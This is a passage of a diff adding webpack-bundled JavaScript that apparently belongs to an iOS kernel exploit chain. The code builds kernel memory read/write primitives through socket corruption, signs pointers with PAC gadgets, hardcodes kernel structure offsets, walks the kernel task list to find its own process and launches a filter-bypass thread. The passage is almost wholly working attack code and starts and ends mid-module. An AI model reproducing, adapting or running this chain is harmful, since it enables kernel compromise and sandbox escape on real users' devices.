migKernelStackLRPtr = thread_arg + 0x48n;\nlet monitorThread1Ptr = thread_arg + 0x50n;\nlet monitorThread2Ptr = thread_arg + 0x58n;\n\nlet kernelControl = uread64(kernelControlPtr);\nlet kernelRW = uread64(kernelRWPtr);\nlet kernelBase = uread64(kernelBasePtr);\nlet mainThreadAddr = uread64(mainThreadAddrPtr);\nrunBypassFlagPtr = uread64(runBypassFlagPtr);\nisRunningPtr = uread64(isRunningPtr);\nlet mutex = uread64(mutexPtr);\nlet migLock = uread64(migLockPtr);\nlet migSbxMsg = uread64(migSbxMsgPtr);\nlet migKernelStackLR = uread64(migKernelStackLRPtr);\nmonitorThread1Ptr = uread64(monitorThread1Ptr);\nmonitorThread2Ptr = uread64(monitorThread2Ptr);\n\nconsole.log(TAG, \"kernelControl:     \" + kernelControl);\nconsole.log(TAG, \"kernelRW:          \" + kernelRW);\nconsole.log(TAG, \"kernelBase:        \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(kernelBase));\nconsole.log(TAG, \"mainThreadAddr:    \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(mainThreadAddr));\nconsole.log(TAG, \"runBypassFlagPtr:  \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(runBypassFlagPtr));\nconsole.log(TAG, \"isRunningPtr:      \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(isRunningPtr));\nconsole.log(TAG, \"mutex:             \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(mutex));\nconsole.log(TAG, \"migLock:           \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migLock));\nconsole.log(TAG, \"migSbxMsg:         \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migSbxMsg));\nconsole.log(TAG, \"migKernelStackLR:  \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migKernelStackLR));\nconsole.log(TAG, \"monitorThread1Ptr: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(monitorThread1Ptr));\nconsole.log(TAG, \"monitorThread2Ptr: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(monitorThread2Ptr));\n\ntry {\n\tlet driver = new libs_Driver_DriverNewThread__WEBPACK_IMPORTED_MODULE_7__[\"default\"](kernelControl, kernelRW, kernelBase);\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].init(driver, mutex);\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].testKRW();\n\tlibs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_4__[\"default\"].init();\n\n\tconsole.log(TAG, \"Chain initialized\");\n\n\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(isRunningPtr, 1);\n\n\tstartFilterBypass(runBypassFlagPtr);\n\n\tconsole.log(TAG, \"Terminating bypass thread\");\n}\ncatch (error) {\n\tconsole.log(TAG, \"Error: \" + error);\n\tconsole.log(TAG, \"\" + error.stack);\n}\n})();\n\nvar __webpack_export_target__ = exports;\nfor(var __webpack_i__ in __webpack_exports__) __webpack_export_target__[__webpack_i__] = __webpack_exports__[__webpack_i__];\nif(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, \"__esModule\", { value: true });\n/******/ })()\n;");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
+ });
+ const __WEBPACK_DEFAULT_EXPORT__ = (" (() => { \n \t\"use strict\";\n \tvar __webpack_modules__ = ({\n\n \"./src/libs/Chain/Chain.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( Chain)\n });\n var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( \"./src/libs/JSUtils/Utils.js\");\n\n\nconst TAG = \"CHAIN\"\n\nclass Chain\n{\n\tstatic #driver;\n\tstatic #mutex;\n\n\tstatic init(driver, mutex=null)\n\t{\n\t\tthis.#driver = driver;\n\t\tthis.#mutex = mutex;\n\t}\n\n\tstatic destroy()\n\t{\n\t\tthis.#driver.destroy();\n\t}\n\n\tstatic runPE()\n\t{\n\t\treturn this.#driver.runPE();\n\t}\n\n\tstatic getKernelBase()\n\t{\n\t\treturn this.#driver.getKernelBase();\n\t}\n\n\tstatic getSelfTaskAddr()\n\t{\n\t\treturn this.#driver.getSelfTaskAddr();\n\t}\n\n\tstatic read(srcAddr, dst, len)\n\t{\n\t\tthis.#mutexLock();\n\t\tlet ret = this.#driver.read(srcAddr, dst, len);\n\t\tthis.#mutexUnlock();\n\t\treturn ret;\n\t}\n\n\tstatic write(dst, src, len)\n\t{\n\t\tthis.#mutexLock();\n\t\tlet ret = this.#driver.write(dst, src, len);\n\t\tthis.#mutexUnlock();\n\t\treturn ret;\n\t}\n\n\tstatic readBuff(srcAddr, len)\n\t{\n\t\tif (!this.read(srcAddr, Native.mem, len))\n\t\t\treturn false;\n\t\treturn Native.read(Native.mem, len);\n\t}\n\n\tstatic read8(src)\n\t{\n\t\tthis.read(src, Native.mem, 1);\n\t\treturn Native.read8(Native.mem);\n\t}\n\n\tstatic read16(src)\n\t{\n\t\tthis.read(src, Native.mem, 2);\n\t\treturn Native.read16(Native.mem);\n\t}\n\n\tstatic read32(src)\n\t{\n\t\tthis.read(src, Native.mem, 4);\n\t\treturn Native.read32(Native.mem);\n\t}\n\n\tstatic read64(src)\n\t{\n\t\tthis.read(src, Native.mem, 8);\n\t\treturn Native.read64(Native.mem);\n\t}\n\n\tstatic write8(dst, value)\n\t{\n\t\tNative.write8(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 1);\n\t}\n\n\tstatic write16(dst, value)\n\t{\n\t\tNative.write16(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 2);\n\t}\n\n\tstatic write32(dst, value)\n\t{\n\t\tNative.write32(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 4);\n\t}\n\n\tstatic write64(dst, value)\n\t{\n\t\tNative.write64(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 8);\n\t}\n\n\tstatic offsets()\n\t{\n\t\treturn this.#driver.offsets();\n\t}\n\n\tstatic strip(val)\n\t{\n\t\treturn this.#driver.strip(val);\n\t}\n\n\tstatic writeZoneElement(dstAddr,src,len)\n\t{\n\t\treturn this.#driver.writeZoneElement(dstAddr, src, len);\n\t}\n\n\tstatic getPaciaGadget()\n\t{\n\t\treturn this.#driver.getPaciaGadget();\n\t}\n\tstatic getClearPaciaGadget()\n\t{\n\t\treturn this.#driver.getClearPaciaGadget();\n\t}\n\n\tstatic transferRW()\n\t{\n\t\tlet rwCtx = this.#driver.transferRW();\n\t\tlet controlSocket = rwCtx.controlSocket;\n\t\tlet rwSocket = rwCtx.rwSocket;\n\t\tconsole.log(TAG, \"controlSocket: \" + controlSocket);\n\t\tconsole.log(TAG, \"rwSocket: \" + rwSocket);\n\n\t\tlet portPtr = Native.mem;\n\t\tNative.callSymbol(\"fileport_makeport\", controlSocket, portPtr);\n\t\tlet controlPort = Native.read32(portPtr);\n\n\t\tNative.callSymbol(\"fileport_makeport\", rwSocket, portPtr);\n\t\tlet rwPort = Native.read32(portPtr);\n\n\t\treturn {\n\t\t\tcontrolPort: controlPort,\n\t\t\trwPort: rwPort,\n\t\t\tcontrolSocket: controlSocket,\n\t\t\trwSocket: rwSocket\n\t\t};\n\t}\n\n\tstatic threadSpawn(scriptCFString, threadMem) {\n\t\tthis.#driver.threadSpawn(scriptCFString, threadMem);\n\t}\n\n\tstatic testKRW() {\n\t\tconsole.log(TAG, \"Testing KRW\");\n\t\tconsole.log(TAG, \"- kernelBase: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(this.getKernelBase()));\n\t\tconsole.log(TAG, \"- PACIA gadget: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(this.getPaciaGadget()));\n\t\tconsole.log(TAG, \"- Read kernel magic (4 bytes)\");\n\n\t\tlet buff = this.readBuff(this.getKernelBase(), 4);\n\t\tif (!buff) {\n\t\t\tconsole.log(TAG, \"kernel RW not working!\");\n\t\t\treturn false;\n\t\t}\n\t\tlet buff32 = new Uint32Array(buff);\n\t\tconsole.log(TAG, `- Magic: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(buff32[0])}`);\n\n\t\tif (buff32[0] != 0xfeedfacf) {\n\t\t\tconsole.log(TAG, \"Invalid magic!\");\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n\tstatic #mutexLock() {\n\t\tif (this.#mutex)\n\t\t\tNative.callSymbol(\"pthread_mutex_lock\", this.#mutex);\n\t}\n\n\tstatic #mutexUnlock() {\n\t\tif (this.#mutex)\n\t\t\tNative.callSymbol(\"pthread_mutex_unlock\", this.#mutex);\n\t}\n}\n\n\n }),\n\n \"./src/libs/Chain/Native.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( Native)\n });\nconst RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;\n\nclass Native {\n\n\t\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\n\t\n\tstatic #argMem = 0n;\n\n\t\n\tstatic #argPtr = 0n;\n\n\tstatic {\n\t\tthis.mem = this.callSymbol(\"malloc\", this.memSize);\n\t\tthis.#argMem = this.callSymbol(\"malloc\", 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t}\n\n\tstatic write(ptr, buff) {\n\t\tlet buffPtr = read64(read64(addrof(buff) + 0x10n) + 0x10n);\n\t\tthis.callSymbol(\"memcpy\", ptr, buffPtr, buff.byteLength);\n\t}\n\tstatic write32(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(4);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint32(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic read(ptr, length) {\n\t\tlet buffRes = new ArrayBuffer(length);\n\t\tlet buffPtr = read64(read64(addrof(buffRes) + 0x10n) + 0x10n);\n\t\tthis.callSymbol(\"memcpy\", buffPtr, ptr, length);\n\t\treturn buffRes;\n\t}\n\n\tstatic read8(ptr) {\n\t\tlet buff = this.read(ptr, 1);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint8(0);\n\t}\n\n\tstatic read16(ptr) {\n\t\tlet buff = this.read(ptr, 2);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint16(0, true);\n\t}\n\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint32(0, true);\n\t}\n\n\tstatic read64(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\n\tstatic readPtr(ptr) {\n\t\treturn this.read64(ptr);\n\t}\n\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\n\tstatic write8(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(1);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint8(0, value);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write16(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(2);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint16(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write32(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(4);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint32(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write64(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(8);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic writeString(ptr, str) {\n\t\t\n\t\t\n\t\tthis.callSymbol(\"memcpy\", ptr, str, str.length + 1);\n\t}\n\n\tstatic getCString(str) {\n\t\treturn get_cstring(str);\n\t}\n\n\tstatic #prepareArg(arg) {\n\t\tif(!arg)\n\t\t\targ = 0n;\n\t\tif(typeof(arg) === \"string\")\n\t\t\treturn get_cstring(arg);\n\t\treturn BigInt(arg);\n\t}\n\n\tstatic strip(address) {\n\t\treturn address & 0x7fffffffffn;\n\t}\n\n\tstatic pacia(address, modifier) {\n\t\taddress = Native.strip(address);\n\t\t\n\t\tlet signedAddress = pacia(address, BigInt(modifier));\n\t\t\n\t\treturn signedAddress;\n\t}\n\n\tstatic dlsym(name) {\n\t\treturn Native.callSymbol(\"dlsym\", RTLD_DEFAULT, name);\n\t}\n\n\tstatic callSymbol(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {\n\t\tlet funcSymbol = null;\n\t\tif(name === \"dlysm\")\n\t\t\tfuncSymbol = DLSYM;\n\t\telse\n\t\t\tfuncSymbol = fcall(DLSYM,RTLD_DEFAULT,get_cstring(name));\n\t\ta0 = this.#prepareArg(a0);\n\t\ta1 = this.#prepareArg(a1);\n\t\ta2 = this.#prepareArg(a2);\n\t\ta3 = this.#prepareArg(a3);\n\t\ta4 = this.#prepareArg(a4);\n\t\ta5 = this.#prepareArg(a5);\n\t\ta6 = this.#prepareArg(a6);\n\t\ta7 = this.#prepareArg(a7);\n\t\ta8 = this.#prepareArg(a8);\n\t\ta9 = this.#prepareArg(a9);\n\t\ta10 = this.#prepareArg(a10);\n\t\ta11 = this.#prepareArg(a11);\n\t\ta12 = this.#prepareArg(a12);\n\t\ta13 = this.#prepareArg(a13);\n\t\ta14 = this.#prepareArg(a14);\n\t\ta15 = this.#prepareArg(a15);\n\t\tlet chosen_fcall = null;\n\t\tif(typeof fcall_with_pacia !== 'undefined')\n\t\t\tchosen_fcall = fcall_with_pacia;\n\t\telse\n\t\t\tchosen_fcall = fcall;\n\t\tconst ret64 = chosen_fcall(funcSymbol, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\tif (ret64 == 0xffffffffffffffffn)\n\t\t\treturn -1;\n\t\treturn ret64;\n\t}\n\n\tstatic callSymbolRetain(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {\n\t\treturn Native.callSymbol(name,a0,a1,a2,a3,a4,a5,a6,a7,a8, a9, a10, a11, a12, a13, a14, a15);\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\n\tstatic #doNativeCall(func, name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = func(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn this.#fromNative(ret);\n\t}\n\n\tstatic #fromNative(value) {\n\t\tif (!(value instanceof ArrayBuffer))\n\t\t\treturn value;\n\t\tconst view = new DataView(value);\n\t\treturn view.getBigInt64(0, true);\n\t}\n\n\tstatic #toNative(value) {\n\t\t\n\t\tif (typeof value === 'string') {\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn this.#bigIntToArray(ptr);\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn this.#bigIntToArray(value);\n\t\t}\n\t\telse\n\t\t\treturn value;\n\t}\n\n\tstatic #bigIntToArray(value) {\n\t\tlet a = new Uint8Array(8);\n\t\tfor (let i=0; i<8; i++) {\n\t\t\ta[i] = Number(value & 0xffn)\n\t\t\tvalue >>= 8n;\n\t\t}\n\t\treturn a.buffer;\n\t}\n\tstatic gc() {\n\t}\n}\n\n\nglobalThis.Native = Native;\n\n\n }),\n\n \"./src/libs/Chain/OffsetsStruct.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( OffsetsStruct)\n });\nconst OFFSET_KERNEL_BASE  = 0xfffffff007004000n\n\n\nconst OFFSET_KERNEL_TASK = 0x0n\nconst OFFSET_TASK_MAP = 0x28n\nconst OFFSET_TASK_NEXT = 0x30n\nconst OFFSET_TASK_PREV = 0x38n\nconst OFFSET_TASK_THREADS = 0x58n\nconst OFFSET_TASK_IPC_SPACE = 0x300n\nconst OFFSET_TASK_PROC_RO = 0x3a0n\nconst OFFSET_TASK_PROC_SIZE = 0x740n \nconst OFFSET_TASK_EXC_GUARD = 0x5d4n\n\nconst OFFSET_IPC_SPACE_TABLE = 0x20n\nconst OFFSET_IPC_ENTRY_OBJECT =\t0x0n\nconst OFFSET_IPC_OBJECT_KOBJECT = 0x48n\nconst OFFSET_IPC_PORT_IP_NSREQUEST = 0x58n\nconst OFFSET_IPC_PORT_IP_SORIGHTS = 0x84n\n\nconst OFFSET_PROC_PID = 0x60n\nconst OFFSET_PROC_P_COMM = 0x568n\n\nconst OFFSET_THREAD_OPTIONS = 0x70n\nconst OFFSET_THREAD_KSTACKPTR = 0xf0n\nconst OFFSET_THREAD_ROP_PID = 0x160n\nconst OFFSET_THREAD_JOP_PID = 0x168n\nconst OFFSET_THREAD_GUARD_EXC_CODE = 0x330n\nconst OFFSET_THREAD_TASK_THREADS = 0x370n\nconst OFFSET_THREAD_TRO = 0x380n\nconst OFFSET_THREAD_AST = 0x3a4n\nconst OFFSET_THREAD_MUTEX_DATA = 0x3b0n\nconst OFFSET_THREAD_CTID = 0x430n\n\nconst OFFSET_TRO_TASK = 0x20n\n\nconst OFFSET_VM_HDR_RBH_ROOT = 0x38n\nconst OFFSET_VM_RBE_LEFT = 0x0n\nconst OFFSET_VM_RBE_RIGHT = 0x8n\n\nconst OFFSET_VM_OBJECT_VOU_SIZE = 0x18n\nconst OFFSET_VM_OBJECT_REF_COUNT = 0x28n\n\nconst OFFSET_VM_NAMED_ENTRY_COPY = 0x10n\nconst OFFSET_VM_NAMED_ENTRY_NEXT = 0x20n\n\nconst OFFSET_MIG_LOCK = 0x0n;\nconst OFFSET_MIG_SBXMSG = 0x0n;\nclass OffsetsStruct\n{\n\tconstructor() {\n\t\tthis.baseKernel = OFFSET_KERNEL_BASE;\n\t\tthis.kernelTask = OFFSET_KERNEL_TASK;\n\t\tthis.T1SZ_BOOT = 17n;\n\n\t\tthis.mapTask = OFFSET_TASK_MAP;\n\t\tthis.nextTask = OFFSET_TASK_NEXT;\n\t\tthis.prevTask = OFFSET_TASK_PREV;\n\t\tthis.threads = OFFSET_TASK_THREADS;\n\t\tthis.ipcSpace = OFFSET_TASK_IPC_SPACE;\n\t\tthis.procRO = OFFSET_TASK_PROC_RO;\n\t\tthis.procSize = OFFSET_TASK_PROC_SIZE;\n\t\tthis.excGuard = OFFSET_TASK_EXC_GUARD;\n\n\t\tthis.spaceTable = OFFSET_IPC_SPACE_TABLE;\n\t\tthis.entryObject = OFFSET_IPC_ENTRY_OBJECT;\n\t\tthis.objectKObject = OFFSET_IPC_OBJECT_KOBJECT;\n\t\tthis.ipNsRequest = OFFSET_IPC_PORT_IP_NSREQUEST;\n\t\tthis.ipSorights = OFFSET_IPC_PORT_IP_SORIGHTS;\n\n\t\tthis.pid = OFFSET_PROC_PID;\n\t\tthis.pComm = OFFSET_PROC_P_COMM;\n\n\t\tthis.options = OFFSET_THREAD_OPTIONS;\n\t\tthis.kstackptr = OFFSET_THREAD_KSTACKPTR;\n\t\tthis.ropPid = OFFSET_THREAD_ROP_PID;\n\t\tthis.jopPid = OFFSET_THREAD_JOP_PID;\n\t\tthis.guardExcCode = OFFSET_THREAD_GUARD_EXC_CODE;\n\t\tthis.taskThreads = OFFSET_THREAD_TASK_THREADS;\n\t\tthis.tro = OFFSET_THREAD_TRO;\n\t\tthis.ast = OFFSET_THREAD_AST;\n\t\tthis.mutexData = OFFSET_THREAD_MUTEX_DATA;\n\t\tthis.ctid = OFFSET_THREAD_CTID;\n\n\t\tthis.troTask = OFFSET_TRO_TASK;\n\n\t\tthis.hdrRBHRoot = OFFSET_VM_HDR_RBH_ROOT;\n\t\tthis.rbeLeft = OFFSET_VM_RBE_LEFT;\n\t\tthis.rbeRight = OFFSET_VM_RBE_RIGHT;\n\n\t\tthis.vouSize = OFFSET_VM_OBJECT_VOU_SIZE;\n\t\tthis.refCount = OFFSET_VM_OBJECT_REF_COUNT;\n\n\t\tthis.backingCopy = OFFSET_VM_NAMED_ENTRY_COPY;\n\t\tthis.next = OFFSET_VM_NAMED_ENTRY_NEXT;\n\t\tthis.migLock = OFFSET_MIG_LOCK;\n\t\tthis.migSbxMsg = OFFSET_MIG_SBXMSG;\n\t}\n}\n\n\n }),\n\n \"./src/libs/Driver/DriverNewThread.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( DriverNewThread)\n });\n var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( \"./src/libs/Driver/Offsets.js\");\n var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( \"./src/libs/JSUtils/Utils.js\");\n var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( \"./src/libs/Chain/Chain.js\");\n\n\n\n\nconst TAG = \"DRIVER-NEWTHREAD\"\n\nconst EARLY_KRW_LENGTH = 0x20n;\nconst IPPROTO_ICMPV6 = 58n;\nconst ICMP6_FILTER = 18n;\n\nclass DriverNewThread\n{\n\t#offsets;\n\t#controlSocket;\n\t#rwSocket;\n\t#kernelBase;\n\t#paciaGadget;\n\t#tmpWriteMem;\n\n\tconstructor(controlSocket, rwSocket, kernelBase, paciaGadget=0n) {\n\t\tthis.#offsets = _Offsets__WEBPACK_IMPORTED_MODULE_0__[\"default\"].getByDeviceAndVersion();\n\t\tthis.#controlSocket = controlSocket;\n\t\tthis.#rwSocket = rwSocket;\n\t\tthis.#kernelBase = kernelBase;\n\t\tthis.#paciaGadget = paciaGadget;\n\t\tthis.#tmpWriteMem = Native.callSymbol(\"malloc\", EARLY_KRW_LENGTH);\n\n\t\tconsole.log(TAG, `Got RW context: ${this.#controlSocket}, ${this.#rwSocket}`);\n\t}\n\n\tdestroy() {\n\t\tconsole.log(TAG, \"Destroy\");\n\t\tNative.callSymbol(\"free\", this.#tmpWriteMem);\n\t\tNative.callSymbol(\"close\", this.#controlSocket);\n\t\tNative.callSymbol(\"close\", this.#rwSocket);\n\t}\n\n\tread(srcAddr, dst, len) {\n\t\t\n\t\tsrcAddr = this.strip(srcAddr);\n\t\tif (srcAddr < 0xffffffd000000000n) {\n\t\t\tconsole.log(TAG, `Invalid kaddr, cannot read: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(srcAddr)}`);\n\t\t\treturn false;\n\t\t}\n\t\treturn this.#kreadLength(srcAddr, dst, len);\n\t}\n\n\twrite(dst, src, len) {\n\t\tlet dstAddr = this.strip(dst);\n\t\tif (dstAddr < 0xffffffd000000000n) {\n\t\t\tconsole.log(TAG, `Invalid kaddr, cannot write: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(dstAddr)}`);\n\t\t\treturn false;\n\t\t}\n\t\treturn this.#kwriteLength(dst, src, len);\n\t}\n\n\twriteZoneElement(dst, src, len) {\n\t\tconst CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE = 0x20n;\n\n\t\tif (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {\n\t\t\tconsole.log(TAG, \"writeZoneElement supports only zone element size >= 0x20\");\n\t\t\treturn false;\n\t\t}\n\n\t\tlet write_size = 0n;\n\t\tlet write_offset = 0n;\n\n\t\tlet remaining = BigInt(len);\n\t\twhile (remaining != 0n) {\n\t\t\twrite_size = (remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) ?\n\t\t\t\tCHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : (remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);\n\n\t\t\tlet kwrite_dst_addr = (dst + write_offset);\n\t\t\tlet kwrite_src_addr = (src + write_offset);\n\n\t\t\tif (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {\n\t\t\t\tlet adjust = (CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size);\n\t\t\t\tkwrite_dst_addr -= adjust;\n\t\t\t\tkwrite_src_addr -= adjust;\n\t\t\t}\n\t\t\tif (!this.#kwriteLength(kwrite_dst_addr,kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE))\n\t\t\t\treturn false;\n\t\t\tremaining -= write_size;\n\t\t\twrite_offset += write_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\tstrip(val) {\n\t\t\n\t\treturn val | 0xffffff8000000000n;\n\t}\n\n\toffsets() {\n\t\treturn this.#offsets;\n\t}\n\n\tgetPaciaGadget() {\n\t\treturn this.#paciaGadget;\n\t}\n\n\tgetKernelBase() {\n\t\treturn this.#kernelBase;\n\t}\n\t\n\tgetSelfTaskAddr() {\n\t\tconsole.log(TAG, `getSelfTaskAddr`);\n\n\t\tlet selfTaskKaddr = 0;\n\t\tfor (let i=0; i<5; i++)\n\t\t{\n\t\t\tselfTaskKaddr = this.#findSelfTaskKaddr(true);\n\t\t\tif (!selfTaskKaddr)\n\t\t\t{\n\t\t\t\tconsole.log(TAG, `Searching the other way around`);\n\t\t\t\tselfTaskKaddr = this.#findSelfTaskKaddr(false);\n\t\t\t}\n\t\t\telse\n\t\t\t\tbreak;\n\t\t\tNative.callSymbol(\"usleep\",20000);\n\t\t}\n\t\treturn selfTaskKaddr;\n\t}\n\n\tthreadSpawn(scriptCFString, threadMem) {\n\t\tconsole.log(TAG, \"threadSpawn() not implemented!\");\n\t\tNative.callSymbol(\"sleep\", 2);\n\t}\n\n\t#findSelfTaskKaddr(direction) {\t\n\t\tlet kernelTaskAddr = this.#kernelBase + this.#offsets.kernelTask;\n\t\tconsole.log(TAG, `baseKernel: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.#kernelBase)}, kernelTask: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kernelTaskAddr)}`);\n\t\n\t\tlet kernelTaskVal = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskAddr);\n\t\t\n\t\tlet ourPid = Native.callSymbol(\"getpid\");\n\t\tconsole.log(TAG, `Our pid: ${ourPid}`);\n\t\n\t\tlet nextTask = 0n;\n\t\tif (direction)\n\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskVal + this.#offsets.nextTask);\n\t\telse\n\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskVal + this.#offsets.prevTask);\n\t\t\n\n\t\twhile (nextTask != 0 && nextTask != kernelTaskVal) {\n\t\t\tlet procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.procRO);\n\t\t\t\n\t\t\tlet procVal = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(procROAddr);\n\t\t\t\n\t\t\tif (procVal && this.strip(procVal) > 0xffffffd000000000n) {\n\t\t\t\tlet pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procVal + this.#offsets.pid);\n\t\t\t\t\n\t\t\t\tif (pid == ourPid) {\n\t\t\t\t\tconsole.log(TAG, `Found our pid`);\n\t\t\t\t\treturn nextTask;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (direction)\n\t\t\t\t\tnextTask = 